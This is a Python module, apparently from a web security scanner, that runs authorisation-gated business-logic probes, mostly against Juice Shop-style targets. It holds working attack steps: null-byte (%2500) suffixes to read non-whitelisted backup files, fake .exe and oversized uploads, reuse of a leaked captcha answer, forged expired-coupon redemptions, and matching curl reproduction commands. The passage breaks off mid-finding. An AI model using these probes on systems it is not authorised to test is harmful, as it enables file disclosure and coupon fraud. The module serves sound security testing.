# -*- coding: utf-8 -*-
"""
业务逻辑主动验证套件（测试靶场模式）
====================================

背景：WSTG-BUSL 这批项过去一律登记「待人工执行」，只在 recon 层做只读定位。
安全负责人拍板在**测试靶场模式**下放开低风险子集后，本模块提供主动验证：

  · 双锁门控：deep 档 + 台账 `allow_write`（公网目标不带 --allow-write，
    本套件整段不执行，BUSL 各项自动回落为原来的「待人工 + 静态定位」）；
  · 只把**真实复现**的漏洞写成发现（PROVEN），复现不了的如实写「未确证」，
    绝不为了涨分把状态改成「不通过」（红线 1/9）；
  · 每个动作计入 ctx.submissions，报告里可追溯。

判定语义（与 engine.business 的 ReconOutcome 对齐）：
  findings 非空 → _apply_recon 把该项置「不通过」并挂证据；
  ran=True 无 findings → 保持「待人工执行」，附实测说明；
  ran=False     → 保持「待人工执行」，显式写出未执行原因。
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import re
import struct
import time
import urllib.parse
from datetime import datetime

from engine.registry import RISK_DEEP, ReconOutcome

try:  # 复用侦察公共实现，措辞全项目一致
    from engine import recon_identity as _rid
except Exception:  # noqa: BLE001
    _rid = None


# ----------------------------------------------------------------------
# 基础件：门控 / 请求 / 端点发现
# ----------------------------------------------------------------------
def _manual_only(reason: str, extra: str = "") -> ReconOutcome:
    if _rid is not None:
        return _rid._manual_only(reason, extra)
    return ReconOutcome(ran=False, error=reason,
                        note=(extra + "\n" if extra else ""))


def _gate(ctx) -> str:
    """返回空串 = 放行；否则为未执行原因。"""
    if os.environ.get("AISCAN_TAMPER", "on").strip().lower() in ("off", "0", "false", "no"):
        return ("环境变量 AISCAN_TAMPER=off，业务逻辑主动验证已关闭"
                "（与写差分共用同一开关）")
    if not ctx.risk_allowed(RISK_DEEP):
        return ("当前档位非 deep —— 业务逻辑主动验证会产生真实写操作，"
                "仅在 deep 档 + 台账显式授权的测试靶场模式下执行")
    if not getattr(ctx, "allow_write", False):
        return ("授权台账未对本目标显式授权写操作（--allow-write，红线 24）—— "
                "公网目标一律不执行主动业务验证，本项回落为待人工")
    return ""


def _record(ctx, url: str, kind: str, status: int, fields: list[str]) -> None:
    try:
        ctx.probe_count += 1
    except Exception:  # noqa: BLE001
        pass
    try:
        ctx.submissions.append({"url": url, "kind": kind, "status": status,
                                "fields": sorted(str(f) for f in fields)})
    except Exception:  # noqa: BLE001
        pass


def _register_login(ctx):
    """靶场模式：注册一个一次性账号并登录，返回 (token, bid) 或 (None, None)。

    仅用于被 _gate 放行的测试靶场（deep + 台账 allow_write）。注册 / 登录
    都是公开端点，且账号为一次性标记账号，靶场侧可清理，不影响真实业务。
    """
    stamp = int(time.time())
    email = f"aiscan-biz-{stamp}@probe.local"
    password = "Aiscan@Probe2026x"
    reg_eps = _endpoints(ctx, r"(register|signup|registration|注册)",
                         ["/api/Users", "/api/register", "/register", "/api/users"])
    registered = False
    for url in reg_eps[:3]:
        for payload in (
            {"email": email, "password": password, "passwordRepeat": password,
             "securityQuestionId": 1, "securityAnswer": "aiscan"},
            {"email": email, "password": password},
        ):
            r = _req(ctx, "POST", url, json_body=payload, kind="注册一次性账号")
            if r.status_code in (200, 201):
                registered = True
                break
        if registered:
            break
    if not registered:
        return None, None
    login_eps = _endpoints(ctx, r"(login|signin|auth|登入)",
                           ["/rest/user/login", "/api/login", "/login"])
    for url in login_eps[:3]:
        r = _req(ctx, "POST", url, json_body={"email": email, "password": password},
                 kind="登录一次性账号")
        if r.status_code == 200:
            try:
                d = json.loads(r.text or "")
                auth = d.get("authentication") or {}
                return auth.get("token"), auth.get("bid")
            except Exception:  # noqa: BLE001
                continue
    return None, None


def _req(ctx, method: str, url: str, *, json_body=None, data=None, files=None,
         headers=None, account=None, kind: str = "业务逻辑主动验证",
         timeout=None):
    """发一个真实请求并计入披露。异常时返回 None。"""
    import requests

    hdrs = dict(ctx._client.session.headers)
    if account is not None:
        hdrs.update(dict((account.get("headers") or {}) if isinstance(account, dict)
                         else (getattr(account, "headers", None) or {})))
    if headers:
        hdrs.update(headers)
    cookies = None
    if account is not None:
        cookies = dict((account.get("cookies") or {}) if isinstance(account, dict)
                       else (getattr(account, "cookies", None) or {}))
    fields: list[str] = []
    if isinstance(json_body, dict):
        fields = list(json_body.keys())
    elif isinstance(data, dict):
        fields = list(data.keys())
    elif files:
        fields = list(files.keys())
    try:
        r = requests.request(
            method.upper(), url, json=json_body, data=data, files=files,
            timeout=timeout or ctx._client.timeout, verify=False,
            allow_redirects=False, headers=hdrs, cookies=cookies or None)
    except Exception as e:  # noqa: BLE001
        _record(ctx, url, kind, 0, fields)
        ctx_note = f"{type(e).__name__}"
        return _Err(ctx_note)
    _record(ctx, url, kind, r.status_code, fields)
    return r


class _Err:
    """请求异常时占位，让调用点的 r.status_code 统一为 0。"""

    def __init__(self, note: str):
        self.status_code = 0
        self.text = ""
        self.headers: dict = {}
        self.cookies: dict = {}
        self.note = note


def _surface_paths(ctx) -> list[str]:
    from engine import business as _biz  # noqa: PLC0415
    try:
        surf = _biz._surface_of(ctx)
        return [str(p) for p in list(getattr(surf, "api_paths", []) or [])]
    except Exception:  # noqa: BLE001
        return []


def _endpoints(ctx, pattern: str, extra=()) -> list[str]:
    """从已采集的前端/JS 路径里按模式挑端点，再补常见候选。"""
    pat = re.compile(pattern, re.I)
    out: list[str] = []
    for p in _surface_paths(ctx):
        if pat.search(p):
            u = urllib.parse.urljoin(ctx.target_url, p.split("?")[0])
            if u not in out:
                out.append(u)
    for p in extra:
        u = urllib.parse.urljoin(ctx.target_url, p)
        if u not in out:
            out.append(u)
    return out


def _first_path(paths: list[str], pattern: str) -> str:
    """取第一个匹配模式的原始路径（用于 :id 模板替换前的占位）。"""
    pat = re.compile(pattern, re.I)
    for p in paths:
        if pat.search(p):
            return p
    return ""


# ----------------------------------------------------------------------
# Z85（Juice Shop 类优惠券编码；stdlib 实现，零依赖）
# ----------------------------------------------------------------------
_Z85_ENC = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#"
_Z85_DEC = {c: i for i, c in enumerate(_Z85_ENC)}


def z85_decode(s: str) -> bytes:
    out = bytearray()
    for i in range(0, len(s), 5):
        chunk = s[i:i + 5]
        v = 0
        for c in chunk:
            v = v * 85 + _Z85_DEC[c]
        out += v.to_bytes(4, "big")[:len(chunk) - 1]
    return bytes(out)


def z85_encode(raw: bytes) -> str:
    out = []
    for i in range(0, len(raw), 4):
        chunk = raw[i:i + 4]
        pad = 4 - len(chunk)
        v = int.from_bytes(chunk + b"\0" * pad, "big")
        chars = []
        for _ in range(5):
            chars.append(_Z85_ENC[v % 85])
            v //= 85
        out.extend(reversed(chars))
        if pad:
            out = out[:-pad]
    return "".join(out)


def _expired_coupon_codes() -> list[str]:
    """本地构造若干「过去月份」的优惠券（MMMYY-NN → z85）。"""
    months = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN",
              "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"]
    now = datetime.now()
    codes = []
    for back in (1, 12, 13, 24, 36, 48):
        total = now.year * 12 + now.month - 1 - back
        y, m = divmod(total, 12)
        yy = f"{y % 100:02d}"
        for disc in (10, 15, 20):
            codes.append(z85_encode(f"{months[m]}{yy}-{disc:02d}".encode()))
    return codes


def _totp(secret_b32: str, at: float | None = None) -> str:
    key = base64.b32decode(secret_b32 + "=" * ((8 - len(secret_b32) % 8) % 8))
    counter = int((at or time.time()) // 30)
    h = hmac.new(key, struct.pack(">Q", counter), hashlib.sha1).digest()
    o = h[-1] & 0x0F
    return "%06d" % ((struct.unpack(">I", h[o:o + 4])[0] & 0x7FFFFFFF) % 1000000)


_EMAIL_RE = re.compile(r"^[^@\s]+@[^@\s]+\.[^@\s]+$")
_B32_SECRET_RE = re.compile(r"^[A-Z2-7]{16,64}$")


# ----------------------------------------------------------------------
# 探针 1：上传大小 / 类型（BUSL-08；覆盖 Upload Size / Upload Type 挑战）
# ----------------------------------------------------------------------
_UPLOAD_FIELDS = ("file", "files", "upload", "attachment")


# ----------------------------------------------------------------------
# 一次性实验账号（注册 + 登录回验）：会员 / 擦除类验证的自给自足前提
# ----------------------------------------------------------------------
def _fresh_account(ctx, tag: str = "probe") -> tuple[dict | None, str]:
    """注册一个一次性账号并登录，返回 (account, 失败原因)。

    account = {"headers": {...}, "cookies": {...}, "email": ..., "password": ...}
    失败时 account 为 None，第二位是给人看的原因。
    """
    stamp = int(time.time())
    email = f"aiscan-{tag}-{stamp}@probe.local"
    password = "Aiscan@Probe2026x"
    reg_eps = _endpoints(ctx, r"(register|signup|registration|注册)",
                         ["/api/Users", "/api/register", "/register", "/api/users"])
    reg_ok = False
    for url in reg_eps[:3]:
        for payload in ({"email": email, "password": password},
                        {"email": email, "password": password,
                         "passwordRepeat": password}):
            r = _req(ctx, "POST", url, json_body=payload, kind="注册一次性账号")
            if r.status_code in (200, 201):
                reg_ok = True
                break
        if reg_ok:
            break
    if not reg_ok:
        return None, "未找到可用的注册接口（无法创建实验用一次性账号）"
    login_eps = _endpoints(ctx, r"(login|signin|session|登录)",
                           ["/rest/user/login", "/api/login", "/api/session"])
    for url in login_eps[:3]:
        r = _req(ctx, "POST", url, json_body={"email": email, "password": password},
                 kind="一次性账号登录")
        if r.status_code == 200 and (r.text or ""):
            acct: dict = {"headers": {}, "cookies": {}, "email": email,
                          "password": password}
            try:
                d = json.loads(r.text)
                tok = d.get("authentication", {}).get("token") or d.get("token")
                if tok:
                    acct["headers"]["Authorization"] = f"Bearer {tok}"
            except Exception:  # noqa: BLE001
                pass
            if r.cookies:
                acct["cookies"] = dict(r.cookies)
            return acct, ""
    return None, "一次性账号注册成功但无法登录回验（可能需邮箱激活）"


_COUPON_CODES_CACHE: list[str] = []


# ----------------------------------------------------------------------
# 验证码小工具：答案泄露探测 + 带答案重试
# ----------------------------------------------------------------------
def _captcha_endpoints(ctx) -> list[str]:
    return _endpoints(ctx, r"(captcha|验证码)",
                      ["/rest/captcha", "/api/captcha", "/captcha"])


def _fetch_captcha(ctx, url: str) -> dict:
    """取一个验证码；把「答案 / ID」字段原样带回（含泄露的答案）。"""
    r = _req(ctx, "GET", url, kind="取验证码")
    if r.status_code != 200:
        return {}
    try:
        d = json.loads(r.text or "")
    except Exception:  # noqa: BLE001
        return {}
    return d if isinstance(d, dict) else {}


def probe_upload_limits(ctx) -> ReconOutcome:
    why = _gate(ctx)
    if why:
        return _manual_only(why, "上传类主动验证上传一个 150KB 标记文件与一个"
                                 "非白名单扩展名标记文件；未授权时不执行。")
    eps = _endpoints(ctx, r"(upload|attach|import|附件|上传)",
                     ["/file-upload", "/api/upload", "/upload"])
    if not eps:
        return ReconOutcome(
            ran=True, probes=0,
            note="未定位到上传端点（前端路径与常见候选均未命中）—— "
                 "可能本目标没有上传功能，该项维持待人工。")
    tried: list[str] = []
    size_ev: tuple[str, int] | None = None
    type_ev: tuple[str, int] | None = None
    probes = 0
    for url in eps[:3]:
        field = None
        for fname in _UPLOAD_FIELDS:
            probes += 1
            r = _req(ctx, "POST", url,
                     files={fname: (f"aiscan_probe_150k.bin",
                                    b"AISCAN-SIZE-PROBE-" + b"A" * (150 * 1024),
                                    "application/octet-stream")},
                     kind="上传大小探针")
            if r.status_code in (400, 415) and "field" in (r.text or "").lower():
                continue  # 字段名不对，换下一个
            field = fname
            break
        if field is None:
            tried.append(f"{url}→字段名不匹配")
            continue
        if r.status_code in (200, 201, 204):
            size_ev = (url, r.status_code)
        else:
            tried.append(f"{url}[150KB]→{r.status_code}")
        probes += 1
        r2 = _req(ctx, "POST", url,
                  files={field: (f"aiscan_probe_type.exe",
                                 b"MZ" + b"AISCAN-TYPE-PROBE-" + b"A" * 64,
                                 "application/octet-stream")},
                  kind="上传类型探针")
        if r2.status_code in (200, 201, 204):
            type_ev = (url, r2.status_code)
        else:
            tried.append(f"{url}[.exe]→{r2.status_code}")
        if size_ev or type_ev:
            break

    findings: list = []
    notes: list[str] = []
    if size_ev:
        from engine.registry import make_finding
        from engine.checks.base import finding_evidence  # noqa: PLC0415
        url, st = size_ev
        findings.append(make_finding(
            "WSTG-BUSL-08", "文件上传未限制文件大小",
            ctx.target_name, endpoint=url,
            severity="中危", confidence="High", evidence_level="A",
            description=("向目标上传端点提交 150KB 的标记文件，服务端直接接受"
                         f"（HTTP {st}）—— 未对上传文件大小做服务端限制。"),
            technical_detail=(f"POST {url} multipart/form-data，字段 file，"
                              "载荷 aiscan_probe_150k.bin（150,024 字节，"
                              "内容为 AISCAN-SIZE-PROBE 标记 + 填充）。"
                              f"响应 HTTP {st}。"),
            impact=("不限制上传大小可被用于磁盘占满、流量放大与拒绝服务；"
                    "大文件还常成为绕过内容检测（截断扫描）的手法。"),
            reproduction=(f"curl -s -X POST '{url}' -F 'file=@aiscan_probe_150k.bin'"
                          f"  # 期望 {st}"),
            remediation=("服务端对上传文件设置大小上限（按业务实际需要，如 2MB），"
                        "超限直接拒绝；网关层同步限制请求体大小。"),
            compliance="OWASP ASVS 5.4 / CWE-770 / 等保2.0 入侵防范",
            evidence=[finding_evidence("response", f"HTTP {st}（150KB 标记文件被接受）",
                                       f"POST {url}")],
            grading_basis="实测 150KB 文件被接受，证据级 A"))
        notes.append(f"150KB 标记文件上传至 {url} → HTTP {st}（大小未受限）")
    if type_ev:
        from engine.registry import make_finding
        from engine.checks.base import finding_evidence  # noqa: PLC0415
        url, st = type_ev
        findings.append(make_finding(
            "WSTG-BUSL-08", "文件上传未限制文件类型（非白名单扩展名被接受）",
            ctx.target_name, endpoint=url,
            severity="中危", confidence="High", evidence_level="A",
            description=("向目标上传端点提交 .exe（MZ 头）标记文件，服务端直接接受"
                         f"（HTTP {st}）—— 上传接口未按扩展名 / 内容类型做白名单校验。"),
            technical_detail=(f"POST {url} multipart/form-data，载荷 "
                              "aiscan_probe_type.exe（内容为 MZ 头 + "
                              "AISCAN-TYPE-PROBE 标记，无可执行代码）。"
                              f"响应 HTTP {st}。"),
            impact=("可上传任意类型文件至服务端；若上传目录可被解析执行或对外提供"
                    "直链，可能进一步升级为代码执行或恶意文件分发。"),
            reproduction=(f"curl -s -X POST '{url}' -F 'file=@aiscan_probe_type.exe'"
                          f"  # 期望 {st}"),
            remediation=("① 上传白名单只放行业务必需类型；② 同时校验扩展名、"
                        "MIME 与文件魔术字节，三者一致才收；③ 上传目录禁止执行权限。"),
            compliance="OWASP ASVS 5.4 / CWE-434 / 等保2.0 入侵防范",
            evidence=[finding_evidence("response", f"HTTP {st}（.exe 标记文件被接受）",
                                       f"POST {url}")],
            grading_basis="实测 .exe 标记文件被接受，证据级 A"))
        notes.append(f".exe 标记文件上传至 {url} → HTTP {st}（类型未受限）")
    if findings:
        return ReconOutcome(
            ran=True, findings=findings, probes=probes,
            note="；".join(notes) + "。测试文件为无害标记内容，仍建议按整改要求清理。",
            lead=["请清理本次上传的测试文件（内容含 AISCAN-SIZE-PROBE / "
                  "AISCAN-TYPE-PROBE 标记）并留痕"])
    return ReconOutcome(
        ran=True, probes=probes,
        note=("已对上传端点做大小/类型主动验证："
              + ("；".join(tried) if tried else "端点未接受测试文件")
              + " —— 未确证缺失，该项维持待人工（人工需继续验证"
                "「落地后能否被解析执行」）。"))


# ----------------------------------------------------------------------
# 探针 2：毒字节绕过（Poison Null Byte；BUSL-08 映射）
# ----------------------------------------------------------------------
_LISTING_DIRS = ("/ftp/", "/files/", "/downloads/", "/uploads/", "/backup/",
                 "/backups/", "/static/", "/assets/", "/public/")


def _listing_files(body: str) -> list[str]:
    names: list[str] = []
    for m in re.finditer(r'<a[^>]+href=["\']([^"\']+)["\']', body or "", re.I):
        href = m.group(1).strip()
        if not href or href.startswith(("/", "?", "#", "http")) or href.endswith("/"):
            continue
        if re.search(r"\.[A-Za-z0-9]{1,8}$", href):
            names.append(href)
    return names


def probe_poison_null_byte(ctx) -> ReconOutcome:
    why = _gate(ctx)
    if why:
        return _manual_only(why, "毒字节验证会对目录列表中的备份文件做"
                                 "%2500 截断读取；未授权时不执行。")
    probes = 0
    hits: list[tuple[str, str]] = []
    tried: list[str] = []
    for d in _LISTING_DIRS:
        base = urllib.parse.urljoin(ctx.target_url, d)
        probes += 1
        r = _req(ctx, "GET", base, kind="目录列表探测")
        if r.status_code != 200:
            continue
        body = r.text or ""
        if "directory listing" not in body.lower() and \
                "listing directory" not in body.lower() and \
                "index of" not in body.lower() and \
                "<title>" not in body.lower()[:400]:
            continue
        files = _listing_files(body)
        for fname in files[:12]:
            if re.search(r"\.(md|pdf)$", fname, re.I):
                continue  # 白名单内的文件本来就能访问，不构成绕过
            probes += 1
            for suffix in ("%2500.md", "%2500.pdf", "%00.md"):
                r2 = _req(ctx, "GET", base + fname + suffix, kind="毒字节绕过探测")
                if r2.status_code == 200 and len(r2.text or "") > 60 and \
                        "error" not in (r2.text or "")[:200].lower():
                    hits.append((base + fname + suffix, fname))
                    break
            else:
                tried.append(f"{base}{fname}→{r2.status_code}")
        if hits:
            break
    if not hits:
        return ReconOutcome(
            ran=True, probes=probes,
            note=("已对常见静态目录做毒字节截断探测（%2500.md / %2500.pdf / %00.md）"
                  + ("；已试：" + "、".join(tried[:5]) if tried else "未发现可罗列的目录")
                  + " —— 未确证，该项维持待人工。"))
    from engine.registry import make_finding
    from engine.checks.base import finding_evidence  # noqa: PLC0415
    url, fname = hits[0]
    body = _req(ctx, "GET", url, kind="毒字节证据复取").text or ""
    return ReconOutcome(
        ran=True, probes=probes + 1,
        findings=[make_finding(
            "WSTG-BUSL-08", "静态文件访问可被毒字节（Null Byte）绕过扩展名校验",
            ctx.target_name, endpoint=url,
            severity="高危", confidence="High", evidence_level="A",
            description=(f"请求 {url} 时，文件名中的 %2500 被解码为 %00 后截断，"
                         f"服务端按「{fname}」落盘读取并返回了非白名单文件内容 —— "
                         "扩展名白名单校验可被毒字节绕过，敏感备份文件可被直接读取。"),
            technical_detail=(f"GET {url} → HTTP 200，响应体长度 "
                              f"{len(body)} 字节。请求路径在编码层保留 %2500，"
                              "经一层解码后得到 %00，扩展名判断看到的是 .md 而实际"
                              f"读取的是 {fname}。"),
            impact=("攻击者可读取目录中的任意备份 / 配置文件（源码备份、密钥、"
                    "历史优惠券等），直接造成敏感信息泄露。"),
            reproduction=f"curl -s '{url}' | head -c 200  # 返回非白名单文件内容",
            remediation=("① 文件读取按规范化后的真实路径与白名单双重校验；"
                        "② 拒绝路径中出现 %00 / %2500 / 控制字符；"
                        "③ 静态目录不要暴露备份文件。"),
            compliance="OWASP ASVS 5.4 / CWE-158 / 等保2.0 入侵防范",
            evidence=[finding_evidence("response", body[:200],
                                       f"GET {url}（返回 {fname} 内容）")],
            grading_basis="实测毒字节路径返回非白名单文件内容，证据级 A")],
        note=f"GET {url} → HTTP 200，返回非白名单文件 {fname} 内容（前 200 字节已入证据）。")


# ----------------------------------------------------------------------
# 探针 3：评分 / 评价边界（Zero Stars；BUSL-01 映射）
# ----------------------------------------------------------------------
def probe_rating_range(ctx) -> ReconOutcome:
    why = _gate(ctx)
    if why:
        return _manual_only(why, "评分边界验证会以 rating=0 提交一条评价；"
                                 "未授权时不执行。")
    eps = _endpoints(ctx, r"(review|feedback|comment|rate|rating|评价|反馈|评论)",
                     ["/api/Feedbacks", "/api/Reviews", "/api/Comments",
                      "/rest/products/1/reviews"])
    if not eps:
        return ReconOutcome(ran=True, probes=0,
                            note="未定位到评价 / 反馈类端点，该项维持待人工。")
    marker = f"aiscan-rating-probe-{int(time.time())}"
    cap_eps = _captcha_endpoints(ctx)
    token, _ = _register_login(ctx)
    auth_hdrs = {"Authorization": f"Bearer {token}"} if token else {}
    probes = 0
    proven = None
    tried: list[str] = []
    for url in eps[:4]:
        for method in ("POST", "PUT"):
            payload = {"message": marker, "comment": marker,
                       "rating": 0, "author": "aiscan"}
            probes += 1
            r = _req(ctx, method, url, json_body=payload, headers=auth_hdrs,
                     kind="评分边界探针")
            if r.status_code in (404, 405):
                break
            # 反馈类端点常带验证码：401 / 500（验证码查询失败）时取码重试一次
            if r.status_code in (401, 403, 500) and cap_eps:
                cap = _fetch_captcha(ctx, cap_eps[0])
                probes += 1
                if cap:
                    # Juice Shop /api/Feedbacks 期望请求体字段名 = captcha，
                    # 且值为答案值（response 的 answer 字段），并非用 response
                    # 里的键名动态拼字段（那会把答案塞进 answer 字段被忽略）。
                    payload["captchaId"] = cap.get("captchaId")
                    payload["captcha"] = cap.get("answer")
                    probes += 1
                    r = _req(ctx, method, url, json_body=payload,
                             headers=auth_hdrs,
                             kind="评分边界探针（带验证码）")
            if r.status_code not in (200, 201, 204):
                tried.append(f"{url}[{method}]→{r.status_code}")
                continue
            body = r.text or ""
            echoed = re.search(r'"?rating"?\s*[:=]\s*["\']?0(?:\D|$)', body)
            if echoed:
                proven = (url, method, body)
                break
            # 响应没回显 rating 时尝试读回列表页确认落库值
            probes += 1
            rr = _req(ctx, "GET", url, kind="评分读回验证")
            rb = rr.text or ""
            if marker in rb and re.search(r'"?rating"?\s*[:=]\s*["\']?0(?:\D|$)', rb):
                proven = (url, method, rb)
                break
            tried.append(f"{url}[{method}]→已接收但 rating=0 未确认落库")
        if proven:
            break
    if not proven:
        return ReconOutcome(
            ran=True, probes=probes,
            note=("已对评价 / 反馈端点提交 rating=0 主动验证："
                  + ("；".join(tried[:5]) if tried else "端点均未接收")
                  + " —— 未确证「服务端接受 0 评分」，该项维持待人工。"))
    from engine.registry import make_finding
    from engine.checks.base import finding_evidence  # noqa: PLC0415
    url, method, body = proven
    return ReconOutcome(
        ran=True, probes=probes,
        findings=[make_finding(
            "WSTG-BUSL-01", "服务端未校验评分字段取值边界（接受 0 星评价）",
            ctx.target_name, endpoint=url,
            severity="低危", confidence="High", evidence_level="A",
            description=(f"以 {method} {url} 提交 rating=0 的评价内容，"
                         "服务端返回成功且 rating=0 被落库 —— "
                         "前端 1~5 星的取值范围没有在服务端复验。"),
            technical_detail=(f"{method} {url}，body：{{message/comment: "
                              f"{marker}, rating: 0}}。响应回显 / 读回结果中 "
                              "rating 为 0。前端 UI 的范围约束（滑块最小值 1）"
                              "是唯一防线。"),
            impact=("取值范围约束缺失本身是输入校验问题；同类字段（金额、数量、"
                    "次数）若同样只靠前端约束，可被直接构造非法业务数据。"),
            reproduction=(f"curl -s -X {method} '{url}' -H 'Content-Type: "
                          "application/json' -d '{\"message\":\"probe\","
                          "\"rating\":0}'"),
            remediation=("所有取值范围 / 格式约束在服务端独立复验，"
                        "不依赖前端 UI 限制。"),
            compliance="OWASP ASVS 5.4 / CWE-20 / 等保2.0 入侵防范",
            evidence=[finding_evidence("response", body[:200],
                                       f"{method} {url}（rating=0 被接受）")],
            grading_basis="实测 rating=0 被服务端接受并落库，证据级 A")],
        note=(f"{method} {url} 接受 rating=0 并落库（测试标记 {marker}）—— "
              "服务端未复验前端取值范围。"),
        lead=[f"请清理测试评价（标记 {marker}）"])


# ----------------------------------------------------------------------
# 探针 4：过期优惠券（Expired Coupon；BUSL-05 映射）
# ----------------------------------------------------------------------
def probe_coupon_expiry(ctx) -> ReconOutcome:
    why = _gate(ctx)
    if why:
        return _manual_only(why, "过期优惠券验证会兑换本机构造的过期码；"
                                 "未授权时不执行。")
    paths = _surface_paths(ctx)
    urls: list[str] = []
    for t in paths:
        if not re.search(r"coupon", t, re.I):
            continue
        tpl = t.split("?")[0]
        # 路径模板里的 :coupon / :code 占位换成空（后面直接拼码），
        # 其余占位（:id 等）换成 1
        tpl = re.sub(r":(coupon|code)(?=/|$)", "", tpl)
        tpl = re.sub(r":\w+", "1", tpl)
        if not tpl.endswith("/"):
            tpl += "/"
        u = urllib.parse.urljoin(ctx.target_url, tpl)
        if u not in urls:
            urls.append(u)
    # 直接构造 PUT <base>/coupon/<code> 形态
    base = ctx.target_url.rstrip("/")
    for cand in ("/rest/basket/1/coupon/", "/rest/basket/2/coupon/",
                 "/api/basket/1/coupon/"):
        u = base + cand
        if u not in urls:
            urls.append(u)
    if not urls:
        return ReconOutcome(ran=True, probes=0,
                            note="未定位到优惠券兑换端点，该项维持待人工。")
    codes = _expired_coupon_codes()
    probes = 0
    accepted = None
    tried: list[str] = []
    for url in urls[:3]:
        for code in codes[:8]:
            probes += 1
            r = _req(ctx, "PUT", url + urllib.parse.quote(code, safe=""),
                     json_body={}, kind="过期优惠券验证")
            body = (r.text or "")
            if r.status_code in (200, 201) and re.search(r"discount|优惠|折扣", body, re.I):
                accepted = (url, code, body)
                break
            tried.append(f"{code}→{r.status_code}")
        if accepted:
            break
    if not accepted:
        return ReconOutcome(
            ran=True, probes=probes,
            note=(f"已对优惠券端点兑换 {min(len(codes), 8)} 个本地构造的过期码"
                  f"（MMMYY-NN，z85 编码）：均被拒绝（{'、'.join(tried[:6])}）—— "
                  "有效期校验生效，未复现「已过期优惠券可兑换」。"
                  "注：若目标使用非 z85/非 MMMYY-NN 格式的券码，本探针覆盖不到，"
                  "需人工按业务实际券码格式补测。"))
    from engine.registry import make_finding
    from engine.checks.base import finding_evidence  # noqa: PLC0415
    url, code, body = accepted
    return ReconOutcome(
        ran=True, probes=probes,
        findings=[make_finding(
            "WSTG-BUSL-05", "已过期优惠券仍可兑换（有效期未校验）",
            ctx.target_name, endpoint=url,
            severity="中危", confidence="High", evidence_level="A",
            description=(f"PUT {url}{code} 兑换一个月份已过去的优惠券，"
                         "服务端返回折扣生效 —— 优惠券没有校验有效期。"),
            technical_detail=(f"PUT {url}{code} → HTTP 200，"
                              f"响应：{body[:150]}。"),
            impact=("过期营销活动可被无限次利用，造成资损；若券码可枚举，"
                    "还会放大为批量薅羊毛。"),
            reproduction=f"curl -s -X PUT '{url}{code}'  # 返回折扣信息",
            remediation=("服务端校验优惠券有效期（validFrom/validUntil）与使用次数，"
                        "过期 / 超限一律拒绝。"),
            compliance="OWASP ASVS 5.4 / CWE-639 / 等保2.0 入侵防范",
            evidence=[finding_evidence("response", body[:200],
                                       f"PUT {url}{code}（过期券兑换成功）")],
            grading_basis="实测过期券兑换返回折扣，证据级 A")],
        note=f"PUT {url}{code} → 过期优惠券兑换成功（响应含折扣信息）。")


# ----------------------------------------------------------------------
# 探针 5：账户擦除有效性（GDPR；BUSL-06 映射）
# ----------------------------------------------------------------------
def probe_erasure_ineffective(ctx) -> ReconOutcome:
    why = _gate(ctx)
    if why:
        return _manual_only(why, "擦除有效性验证会注册一个一次性账号并提交擦除请求；"
                                 "未授权时不执行。")
    import requests  # noqa: F401

    stamp = int(time.time())
    email = f"aiscan-erasure-{stamp}@probe.local"
    password = "Aiscan@Probe2026x"
    probes = 0

    reg_eps = _endpoints(ctx, r"(register|signup|registration|注册)",
                         ["/api/Users", "/api/register", "/register", "/api/users"])
    reg_ok = False
    for url in reg_eps[:3]:
        for payload in ({"email": email, "password": password},
                        {"email": email, "password": password,
                         "passwordRepeat": password}):
            probes += 1
            r = _req(ctx, "POST", url, json_body=payload, kind="注册一次性账号")
            if r.status_code in (200, 201):
                reg_ok = True
                break
        if reg_ok:
            break
    if not reg_ok:
        return ReconOutcome(
            ran=True, probes=probes,
            note="未找到可用的注册接口（无法创建擦除实验用的一次性账号）—— "
                 "擦除有效性验证未执行，该项维持待人工。")

    login_eps = _endpoints(ctx, r"(login|signin|session|登录)",
                           ["/rest/user/login", "/api/login", "/api/session",
                            "/rest/login"])
    def _login() -> tuple[int, str]:
        nonlocal probes
        for url in login_eps[:3]:
            probes += 1
            r = _req(ctx, "POST", url,
                     json_body={"email": email, "password": password},
                     kind="一次性账号登录")
            if r.status_code == 200 and r.text:
                return 200, r.text
        return 0, ""

    st1, body1 = _login()
    if st1 != 200:
        return ReconOutcome(
            ran=True, probes=probes,
            note="一次性账号注册成功但无法登录回验（可能需邮箱激活）—— "
                 "擦除有效性验证未执行，该项维持待人工。")
    acct = {"headers": {}, "cookies": {}}
    try:
        d = json.loads(body1)
        tok = d.get("authentication", {}).get("token") or d.get("token")
        if tok:
            acct["headers"]["Authorization"] = f"Bearer {tok}"
    except Exception:  # noqa: BLE001
        pass

    er_eps = _endpoints(ctx, r"(erasure|gdpr|privacy|forget|forgot|delete|注销|擦除|删除)",
                        ["/dataerasure", "/api/PrivacyRequests", "/api/User",
                         "/account/delete"])
    erased = False
    for url in er_eps[:3]:
        probes += 1
        r = _req(ctx, "POST", url, json_body={"email": email}, account=acct,
                 kind="账户擦除请求")
        if r.status_code in (200, 201, 202, 204):
            erased = True
            break
    if not erased:
        return ReconOutcome(
            ran=True, probes=probes,
            note="未找到可用的账户擦除 / 数据删除请求接口 —— 验证未执行，"
                 "该项维持待人工（人工需确认目标是否提供该功能）。")

    st2, _ = _login()
    if st2 != 200:
        return ReconOutcome(
            ran=True, probes=probes,
            note=("已对一次性账号提交擦除请求（HTTP 2xx），随后原凭据登录被拒绝 —— "
                  "擦除生效，未复现缺陷，该项维持待人工。"))
    from engine.registry import make_finding
    from engine.checks.base import finding_evidence  # noqa: PLC0415
    return ReconOutcome(
        ran=True, probes=probes,
        findings=[make_finding(
            "WSTG-BUSL-06", "账户擦除请求未使账户失效（原凭据仍可登录）",
            ctx.target_name, endpoint=er_eps[0] if er_eps else "",
            severity="中危", confidence="High", evidence_level="A",
            description=("注册一次性账号并正常登录后提交账户擦除 / 数据删除请求"
                         "（服务端返回成功），随后使用原账号口令再次登录依然成功 —— "
                         "「被遗忘权」流程没有让账户真正失效，个人数据仍可被访问。"),
            technical_detail=(f"实验账号 {email}：注册 → 登录（200）→ "
                              f"POST 擦除端点（2xx）→ 再次登录（200）。"
                              "擦除流程仅记录了请求，未禁用账户 / 未删除数据。"),
            impact=("不符合 GDPR / PIPL 的删除权要求；已「删除」的账户仍是有效"
                    "登录身份，数据泄露面没有收敛，合规与安全双输。"),
